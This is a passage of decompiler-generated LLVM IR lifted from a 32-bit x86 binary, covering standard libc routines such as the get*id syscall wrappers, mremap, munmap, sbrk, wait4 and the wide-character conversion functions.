  %v0_8053e38 = phi i32 [ %v9_8053e20, %entry ], [ -1, %dec_label_pc_8053e2c ]
  %v2_8053e3a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8053e3a, i32* @edx, align 4
  %v2_8053e3c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8053e3c, i32* %edi.global-to-local, align 4
  ret i32 %v0_8053e38

; uselistorder directives
  uselistorder i32 %v9_8053e20, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053e38, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053e40 = load i32, i32* @ebx, align 4
  store i32 %v0_8053e40, i32* %stack_var_-4, align 4
  %v1_8053e49 = call i32 @int80_syscall(i32 202)
  store i32 %v1_8053e49, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_8053e49, -4095
  br i1 %tmp6, label %dec_label_pc_8053e60, label %dec_label_pc_8053e54

dec_label_pc_8053e54:                             ; preds = %entry
  %v0_8053e54 = load i32, i32* %stack_var_-4, align 4
  %v1_8053e54 = call i32 @__errno_location(i32 %v0_8053e54)
  %v0_8053e59 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053e59 = sub i32 0, %v0_8053e59
  %v2_8053e5b = inttoptr i32 %v1_8053e54 to i32*
  store i32 %v1_8053e59, i32* %v2_8053e5b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053e60

dec_label_pc_8053e60:                             ; preds = %entry, %dec_label_pc_8053e54
  %v0_8053e60 = phi i32 [ %v1_8053e49, %entry ], [ -1, %dec_label_pc_8053e54 ]
  %v2_8053e64 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8053e64, i32* @ebx, align 4
  ret i32 %v0_8053e60

; uselistorder directives
  uselistorder i32 %v1_8053e49, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053e60, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053e68 = load i32, i32* @ebx, align 4
  store i32 %v0_8053e68, i32* %stack_var_-4, align 4
  %v1_8053e71 = call i32 @int80_syscall(i32 201)
  store i32 %v1_8053e71, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_8053e71, -4095
  br i1 %tmp6, label %dec_label_pc_8053e88, label %dec_label_pc_8053e7c

dec_label_pc_8053e7c:                             ; preds = %entry
  %v0_8053e7c = load i32, i32* %stack_var_-4, align 4
  %v1_8053e7c = call i32 @__errno_location(i32 %v0_8053e7c)
  %v0_8053e81 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053e81 = sub i32 0, %v0_8053e81
  %v2_8053e83 = inttoptr i32 %v1_8053e7c to i32*
  store i32 %v1_8053e81, i32* %v2_8053e83, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053e88

dec_label_pc_8053e88:                             ; preds = %entry, %dec_label_pc_8053e7c
  %v0_8053e88 = phi i32 [ %v1_8053e71, %entry ], [ -1, %dec_label_pc_8053e7c ]
  %v2_8053e8c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8053e8c, i32* @ebx, align 4
  ret i32 %v0_8053e88

; uselistorder directives
  uselistorder i32 %v1_8053e71, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053e88, { 1, 0 }
}

define i32 @getgid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053e90 = load i32, i32* @ebx, align 4
  store i32 %v0_8053e90, i32* %stack_var_-4, align 4
  %v1_8053e99 = call i32 @int80_syscall(i32 200)
  store i32 %v1_8053e99, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_8053e99, -4095
  br i1 %tmp6, label %dec_label_pc_8053eb0, label %dec_label_pc_8053ea4

dec_label_pc_8053ea4:                             ; preds = %entry
  %v0_8053ea4 = load i32, i32* %stack_var_-4, align 4
  %v1_8053ea4 = call i32 @__errno_location(i32 %v0_8053ea4)
  %v0_8053ea9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053ea9 = sub i32 0, %v0_8053ea9
  %v2_8053eab = inttoptr i32 %v1_8053ea4 to i32*
  store i32 %v1_8053ea9, i32* %v2_8053eab, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053eb0

dec_label_pc_8053eb0:                             ; preds = %entry, %dec_label_pc_8053ea4
  %v0_8053eb0 = phi i32 [ %v1_8053e99, %entry ], [ -1, %dec_label_pc_8053ea4 ]
  %v2_8053eb4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8053eb4, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8053eb0

; uselistorder directives
  uselistorder i32 %v1_8053e99, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053eb0, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053eb8 = load i32, i32* @ebx, align 4
  store i32 %v0_8053eb8, i32* %stack_var_-4, align 4
  %v1_8053ec1 = call i32 @int80_syscall(i32 199)
  store i32 %v1_8053ec1, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_8053ec1, -4095
  br i1 %tmp6, label %dec_label_pc_8053ed8, label %dec_label_pc_8053ecc

dec_label_pc_8053ecc:                             ; preds = %entry
  %v0_8053ecc = load i32, i32* %stack_var_-4, align 4
  %v1_8053ecc = call i32 @__errno_location(i32 %v0_8053ecc)
  %v0_8053ed1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053ed1 = sub i32 0, %v0_8053ed1
  %v2_8053ed3 = inttoptr i32 %v1_8053ecc to i32*
  store i32 %v1_8053ed1, i32* %v2_8053ed3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053ed8

dec_label_pc_8053ed8:                             ; preds = %entry, %dec_label_pc_8053ecc
  %v0_8053ed8 = phi i32 [ %v1_8053ec1, %entry ], [ -1, %dec_label_pc_8053ecc ]
  %v2_8053edc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8053edc, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8053ed8

; uselistorder directives
  uselistorder i32 %v1_8053ec1, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053ed8, { 1, 0 }
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8053ee0 = load i32, i32* @edi, align 4
  %v0_8053ee1 = load i32, i32* @esi, align 4
  store i32 %v0_8053ee1, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* @esi, align 4
  store i32 %arg5, i32* @edi, align 4
  %v0_8053ef9 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v6_8053f01 = call i32 @mremap(i32 %v0_8053ef9, i32 %v0_8053ee1, i32 %v0_8053ee0, i32 %tmp6, i32 %arg1, i32 %arg2)
  store i32 %v0_8053ef9, i32* @ebx, align 4
  store i32 %v6_8053f01, i32* %esi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v6_8053f01, -4095
  br i1 %tmp11, label %dec_label_pc_8053f19, label %dec_label_pc_8053f0d

dec_label_pc_8053f0d:                             ; preds = %entry
  %v1_8053f0d = call i32 @__errno_location(i32 %v0_8053ef9)
  %v0_8053f12 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053f12 = sub i32 0, %v0_8053f12
  %v2_8053f14 = inttoptr i32 %v1_8053f0d to i32*
  store i32 %v1_8053f12, i32* %v2_8053f14, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8053f19

dec_label_pc_8053f19:                             ; preds = %entry, %dec_label_pc_8053f0d
  %v0_8053f19 = phi i32 [ %v6_8053f01, %entry ], [ -1, %dec_label_pc_8053f0d ]
  %v2_8053f1b = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8053f1b, i32* @edx, align 4
  %v2_8053f1c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8053f1c, i32* @esi, align 4
  store i32 %v0_8053ee0, i32* @edi, align 4
  ret i32 %v0_8053f19

; uselistorder directives
  uselistorder i32 %v6_8053f01, { 1, 0, 2 }
  uselistorder i32 %v0_8053ef9, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mremap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8053f19, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053f20 = load i32, i32* @ebx, align 4
  store i32 %v0_8053f20, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_8053f33 = call i32 @munmap(i32 %v0_8053f20, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_8053f33, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v4_8053f33, -4095
  br i1 %tmp8, label %dec_label_pc_8053f4c, label %dec_label_pc_8053f40

dec_label_pc_8053f40:                             ; preds = %entry
  %v0_8053f40 = load i32, i32* %stack_var_-4, align 4
  %v1_8053f40 = call i32 @__errno_location(i32 %v0_8053f40)
  %v0_8053f45 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053f45 = sub i32 0, %v0_8053f45
  %v2_8053f47 = inttoptr i32 %v1_8053f40 to i32*
  store i32 %v1_8053f45, i32* %v2_8053f47, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053f4c

dec_label_pc_8053f4c:                             ; preds = %entry, %dec_label_pc_8053f40
  %v0_8053f4c = phi i32 [ %v4_8053f33, %entry ], [ -1, %dec_label_pc_8053f40 ]
  %v2_8053f4e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8053f4e, i32* @edx, align 4
  %v2_8053f50 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8053f50, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8053f4c

; uselistorder directives
  uselistorder i32 %v4_8053f33, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @munmap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8053f4c, { 1, 0 }
}

define i32 @__libc_nanosleep(%timespec* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = inttoptr i32 %arg2 to %timespec*
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053f54 = load i32, i32* @ebx, align 4
  store i32 %v0_8053f54, i32* %stack_var_-4, align 4
  %v4_8053f58 = ptrtoint %timespec* %arg1 to i32
  store i32 %v4_8053f58, i32* %ebx.global-to-local, align 4
  %v6_8053f67 = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp4)
  store i32 %v6_8053f67, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v6_8053f67, -4095
  br i1 %tmp10, label %dec_label_pc_8053f80, label %dec_label_pc_8053f74

dec_label_pc_8053f74:                             ; preds = %entry
  %v0_8053f74 = load i32, i32* %stack_var_-4, align 4
  %v1_8053f74 = call i32 @__errno_location(i32 %v0_8053f74)
  %v0_8053f79 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053f79 = sub i32 0, %v0_8053f79
  %v2_8053f7b = inttoptr i32 %v1_8053f74 to i32*
  store i32 %v1_8053f79, i32* %v2_8053f7b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053f80

dec_label_pc_8053f80:                             ; preds = %entry, %dec_label_pc_8053f74
  %v0_8053f80 = phi i32 [ %v6_8053f67, %entry ], [ -1, %dec_label_pc_8053f74 ]
  %v2_8053f82 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8053f82, i32* @edx, align 4
  %v2_8053f84 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8053f84, i32* @ebx, align 4
  ret i32 %v0_8053f80

; uselistorder directives
  uselistorder i32 %v6_8053f67, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder %timespec* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8053f80, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_8053f89 = load i32, i32* @ebx, align 4
  %v0_8053f8d = load i32, i32* @global_var_8067804.777, align 4
  %v1_8053f8d = icmp eq i32 %v0_8053f8d, 0
  %v1_8053f98 = icmp eq i1 %v1_8053f8d, false
  br i1 %v1_8053f98, label %dec_label_pc_8053fab, label %dec_label_pc_8053f9a

dec_label_pc_8053f9a:                             ; preds = %entry
  %v1_8053f9f = call i32 @__GI_brk(i32 0)
  %v2_8053fa7 = icmp slt i32 %v1_8053f9f, 0
  br i1 %v2_8053fa7, label %dec_label_pc_8053fcd, label %dec_label_pc_8053f9a.dec_label_pc_8053fab_crit_edge

dec_label_pc_8053f9a.dec_label_pc_8053fab_crit_edge: ; preds = %dec_label_pc_8053f9a
  %v0_8053fad.pre = load i32, i32* @global_var_8067804.777, align 4
  br label %dec_label_pc_8053fab

dec_label_pc_8053fab:                             ; preds = %dec_label_pc_8053f9a.dec_label_pc_8053fab_crit_edge, %entry
  %v0_8053fbb = phi i32 [ %v0_8053fad.pre, %dec_label_pc_8053f9a.dec_label_pc_8053fab_crit_edge ], [ %v0_8053f8d, %entry ]
  %v1_8053fab = icmp eq i32 %arg1, 0
  %v1_8053fb2 = icmp eq i1 %v1_8053fab, false
  br i1 %v1_8053fb2, label %dec_label_pc_8053fb8, label %dec_label_pc_8053fb4

dec_label_pc_8053fb4:                             ; preds = %dec_label_pc_8053fab
  br label %dec_label_pc_8053fd0

dec_label_pc_8053fb8:                             ; preds = %dec_label_pc_8053fab
  store i32 %v0_8053fbb, i32* @ebx, align 4
  %v2_8053fbd = add i32 %v0_8053fbb, %arg1
  %v1_8053fc1 = call i32 @__GI_brk(i32 %v2_8053fbd)
  %v2_8053fc9 = icmp slt i32 %v1_8053fc1, 0
  %v1_8053fcb = icmp eq i1 %v2_8053fc9, false
  br i1 %v1_8053fcb, label %dec_label_pc_8053fb8.dec_label_pc_8053fd0_crit_edge, label %dec_label_pc_8053fcd

dec_label_pc_8053fb8.dec_label_pc_8053fd0_crit_edge: ; preds = %dec_label_pc_8053fb8
  %v0_8053fd0.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8053fd0

dec_label_pc_8053fcd:                             ; preds = %dec_label_pc_8053fb8, %dec_label_pc_8053f9a
  br label %dec_label_pc_8053fd0

dec_label_pc_8053fd0:                             ; preds = %dec_label_pc_8053fb8.dec_label_pc_8053fd0_crit_edge, %dec_label_pc_8053fb4, %dec_label_pc_8053fcd
  %v0_8053fd0 = phi i32 [ %v0_8053fd0.pre, %dec_label_pc_8053fb8.dec_label_pc_8053fd0_crit_edge ], [ %v0_8053fbb, %dec_label_pc_8053fb4 ], [ -1, %dec_label_pc_8053fcd ]
  %v2_8053fd2 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8053fd2, i32* @edx, align 4
  store i32 %v0_8053f89, i32* @ebx, align 4
  ret i32 %v0_8053fd0

; uselistorder directives
  uselistorder i32 %v0_8053fbb, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_8053fd0, { 2, 0, 1 }
}

define i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8053fd8 = load i32, i32* @edi, align 4
  %v0_8053fd9 = load i32, i32* @esi, align 4
  store i32 %v0_8053fd9, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg4, i32* @esi, align 4
  %v0_8053fed = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_8053ff5 = call i32 @wait4(i32 %v0_8053fed, i32 %v0_8053fd9, i32 %v0_8053fd8, i32 %tmp5)
  store i32 %v0_8053fed, i32* @ebx, align 4
  store i32 %v4_8053ff5, i32* %esi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v4_8053ff5, -4095
  br i1 %tmp10, label %dec_label_pc_805400d, label %dec_label_pc_8054001

dec_label_pc_8054001:                             ; preds = %entry
  %v1_8054001 = call i32 @__errno_location(i32 %v0_8053fed)
  %v0_8054006 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054006 = sub i32 0, %v0_8054006
  %v2_8054008 = inttoptr i32 %v1_8054001 to i32*
  store i32 %v1_8054006, i32* %v2_8054008, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805400d

dec_label_pc_805400d:                             ; preds = %entry, %dec_label_pc_8054001
  %v0_805400d = phi i32 [ %v4_8053ff5, %entry ], [ -1, %dec_label_pc_8054001 ]
  %v2_805400f = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805400f, i32* @edx, align 4
  %v2_8054010 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8054010, i32* @esi, align 4
  store i32 %v0_8053fd8, i32* @edi, align 4
  ret i32 %v0_805400d

; uselistorder directives
  uselistorder i32 %v4_8053ff5, { 1, 0, 2 }
  uselistorder i32 %v0_8053fed, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @wait4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805400d, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_80677e4.778 to i32)
}

define i32 @__GI_wcrtomb() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_8054027 = icmp eq i32 %tmp5, 0
  %v1_8054029 = icmp eq i1 %v1_8054027, false
  br i1 %v1_8054029, label %dec_label_pc_8054031, label %dec_label_pc_805402b

dec_label_pc_805402b:                             ; preds = %entry
  %v2_805402b = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_8054031

dec_label_pc_8054031:                             ; preds = %entry, %dec_label_pc_805402b
  %v0_805404d = phi i32 [ %tmp5, %entry ], [ %v2_805402b, %dec_label_pc_805402b ]
  %v0_8054035 = phi i32 [ %tmp4, %entry ], [ 0, %dec_label_pc_805402b ]
  %v2_8054031 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v0_8054035, i32* %stack_var_-4, align 4
  store i32 %v2_8054031, i32* %stack_var_-8, align 4
  %v2_8054048 = ptrtoint i32* %stack_var_-8 to i32
  %v5_805404e = inttoptr i32 %v0_805404d to i8*
  %v6_805404e = call i32 @__GI_wcsnrtombs(i8* %v5_805404e, i32 %v2_8054048, i32 1, i32 16, i32 %tmp)
  %v1_8054056 = icmp eq i32 %v6_805404e, 0
  %v1_8054058 = icmp eq i1 %v1_8054056, false
  br i1 %v1_8054058, label %dec_label_pc_805405c, label %dec_label_pc_805405a

dec_label_pc_805405a:                             ; preds = %dec_label_pc_8054031
  %v1_805405a = and i32 %v6_805404e, -256
  %v2_805405a = or i32 %v1_805405a, 1
  br label %dec_label_pc_805405c

dec_label_pc_805405c:                             ; preds = %dec_label_pc_8054031, %dec_label_pc_805405a
  %v0_805405f = phi i32 [ %v6_805404e, %dec_label_pc_8054031 ], [ %v2_805405a, %dec_label_pc_805405a ]
  ret i32 %v0_805405f

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_805405c, { 1, 0 }
  uselistorder label %dec_label_pc_8054031, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v5_8054075 = inttoptr i32 %tmp to i8*
  %v6_8054075 = call i32 @__GI_wcsnrtombs(i8* %v5_8054075, i32 %tmp1, i32 -1, i32 %tmp2, i32 %tmp3)
  ret i32 %v6_8054075
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8054083 = load i32, i32* @ebx, align 4
  %v4_8054087 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8054087, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  store i32 %arg4, i32* %eax.global-to-local, align 4
  %v1_8054093 = icmp eq i8* %arg1, null
  br i1 %v1_8054093, label %dec_label_pc_80540c7.thread, label %dec_label_pc_8054097

dec_label_pc_8054097:                             ; preds = %entry
  store i32 1, i32* %edi.global-to-local, align 4
  %v12_805409c = icmp eq i32 %v4_8054087, %arg2
  %v1_805409e = icmp eq i1 %v12_805409c, false
  br i1 %v1_805409e, label %dec_label_pc_80540c7, label %dec_label_pc_80540c1

dec_label_pc_80540c7.thread:                      ; preds = %entry
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_80540a4 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80540a4, i32* %edx.global-to-local, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80540d1

dec_label_pc_80540ad:                             ; preds = %dec_label_pc_80540d8
  %v1_80540ad = call i32 @__errno_location(i32 %v0_8054083)
  store i32 %v1_80540ad, i32* %eax.global-to-local, align 4
  %v1_80540b2 = inttoptr i32 %v1_80540ad to i32*
  store i32 84, i32* %v1_80540b2, align 4
  br label %dec_label_pc_80540fe

dec_label_pc_80540bd:                             ; preds = %dec_label_pc_80540df
  store i32 0, i32* %esi.global-to-local, align 4
  %v0_80540f3.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80540ef

dec_label_pc_80540c1:                             ; preds = %dec_label_pc_8054097
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_80540c3 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80540c3, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80540c7

dec_label_pc_80540c7:                             ; preds = %dec_label_pc_8054097, %dec_label_pc_80540c1
  %v2_80540df15 = phi i32 [ %v4_8054087, %dec_label_pc_8054097 ], [ %v2_80540c3, %dec_label_pc_80540c1 ]
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %tmp33 = icmp ult i32 %arg4, %arg3
  br i1 %tmp33, label %dec_label_pc_80540cf, label %dec_label_pc_80540d1

dec_label_pc_80540cf:                             ; preds = %dec_label_pc_80540c7
  store i32 %arg4, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80540d1

dec_label_pc_80540d1:                             ; preds = %dec_label_pc_80540c7.thread, %dec_label_pc_80540c7, %dec_label_pc_80540cf
  %v2_80540df1532 = phi i32 [ %v2_80540df15, %dec_label_pc_80540c7 ], [ %v2_80540df15, %dec_label_pc_80540cf ], [ %v2_80540a4, %dec_label_pc_80540c7.thread ]
  %v0_80540d4 = phi i32 [ %arg3, %dec_label_pc_80540c7 ], [ %arg4, %dec_label_pc_80540cf ], [ %arg3, %dec_label_pc_80540c7.thread ]
  %v1_80540d1 = inttoptr i32 %arg2 to i32*
  %v2_80540d1 = load i32, i32* %v1_80540d1, align 4
  store i32 %v2_80540d1, i32* %esi.global-to-local, align 4
  store i32 %v0_80540d4, i32* @ecx, align 4
  %v1_80540eb3 = icmp eq i32 %v0_80540d4, 0
  %v1_80540ed10 = icmp eq i1 %v1_80540eb3, false
  br i1 %v1_80540ed10, label %dec_label_pc_80540d8, label %dec_label_pc_80540ef

dec_label_pc_80540d8:                             ; preds = %dec_label_pc_80540d1, %dec_label_pc_80540e5
  %v2_80540df = phi i32 [ %v2_80540e8, %dec_label_pc_80540e5 ], [ %v2_80540df1532, %dec_label_pc_80540d1 ]
  %v0_80540d8 = phi i32 [ %v1_80540e5, %dec_label_pc_80540e5 ], [ %v2_80540d1, %dec_label_pc_80540d1 ]
  %v1_80540d8 = inttoptr i32 %v0_80540d8 to i32*
  %v2_80540d8 = load i32, i32* %v1_80540d8, align 4
  store i32 %v2_80540d8, i32* %eax.global-to-local, align 4
  %v6_80540dd = icmp ugt i32 %v2_80540d8, 127
  br i1 %v6_80540dd, label %dec_label_pc_80540ad, label %dec_label_pc_80540df

dec_label_pc_80540df:                             ; preds = %dec_label_pc_80540d8
  %v1_80540df = trunc i32 %v2_80540d8 to i8
  %v3_80540df = inttoptr i32 %v2_80540df to i8*
  store i8 %v1_80540df, i8* %v3_80540df, align 1
  %v0_80540e1 = load i32, i32* %eax.global-to-local, align 4
  %v3_80540e1 = trunc i32 %v0_80540e1 to i8
  %v4_80540e1 = icmp eq i8 %v3_80540e1, 0
  br i1 %v4_80540e1, label %dec_label_pc_80540bd, label %dec_label_pc_80540e5

dec_label_pc_80540e5:                             ; preds = %dec_label_pc_80540df
  %v0_80540e5 = load i32, i32* %esi.global-to-local, align 4
  %v1_80540e5 = add i32 %v0_80540e5, 4
  store i32 %v1_80540e5, i32* %esi.global-to-local, align 4
  %v0_80540e8 = load i32, i32* %edx.global-to-local, align 4
  %v1_80540e8 = load i32, i32* %edi.global-to-local, align 4
  %v2_80540e8 = add i32 %v1_80540e8, %v0_80540e8
  store i32 %v2_80540e8, i32* %edx.global-to-local, align 4
  %v0_80540ea = load i32, i32* @ecx, align 4
  %v1_80540ea = add i32 %v0_80540ea, -1
  %v8_80540ea = icmp eq i32 %v1_80540ea, 0
  store i32 %v1_80540ea, i32* @ecx, align 4
  %v1_80540ed = icmp eq i1 %v8_80540ea, false
  br i1 %v1_80540ed, label %dec_label_pc_80540d8, label %dec_label_pc_80540ef

dec_label_pc_80540ef:                             ; preds = %dec_label_pc_80540e5, %dec_label_pc_80540d1, %dec_label_pc_80540bd
  %v0_80540f7 = phi i32 [ 0, %dec_label_pc_80540bd ], [ %v2_80540d1, %dec_label_pc_80540d1 ], [ %v1_80540e5, %dec_label_pc_80540e5 ]
  %v0_80540f3 = phi i32 [ %v0_80540f3.pre, %dec_label_pc_80540bd ], [ %v2_80540df1532, %dec_label_pc_80540d1 ], [ %v2_80540e8, %dec_label_pc_80540e5 ]
  %v2_80540ef = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80540ef, i32* %eax.global-to-local, align 4
  %v12_80540f3 = icmp eq i32 %v0_80540f3, %v2_80540ef
  br i1 %v12_80540f3, label %dec_label_pc_80540fa, label %dec_label_pc_80540f7

dec_label_pc_80540f7:                             ; preds = %dec_label_pc_80540ef
  %v1_80540f7 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80540f7 = inttoptr i32 %v1_80540f7 to i32*
  store i32 %v0_80540f7, i32* %v2_80540f7, align 4
  br label %dec_label_pc_80540fa

dec_label_pc_80540fa:                             ; preds = %dec_label_pc_80540ef, %dec_label_pc_80540f7
  %v0_80540fa = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80540fa, i32* %eax.global-to-local, align 4
  %v1_80540fc = load i32, i32* @ecx, align 4
  %v2_80540fc = sub i32 %v0_80540fa, %v1_80540fc
  br label %dec_label_pc_80540fe

dec_label_pc_80540fe:                             ; preds = %dec_label_pc_80540ad, %dec_label_pc_80540fa
  %storemerge1 = phi i32 [ %v2_80540fc, %dec_label_pc_80540fa ], [ -1, %dec_label_pc_80540ad ]
  store i32 %storemerge1, i32* %eax.global-to-local, align 4
  store i32 %v0_8054083, i32* @ebx, align 4
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v2_80540e8, { 0, 2, 1 }
  uselistorder i32 %v1_80540e5, { 0, 2, 1 }
  uselistorder i32 %v2_80540d1, { 1, 0, 2 }
  uselistorder i32 %v0_80540d4, { 1, 0 }
  uselistorder i32 %v2_80540df1532, { 1, 0 }
  uselistorder i32 %v4_8054087, { 1, 0, 2 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 3, 1, 4, 2, 5 }
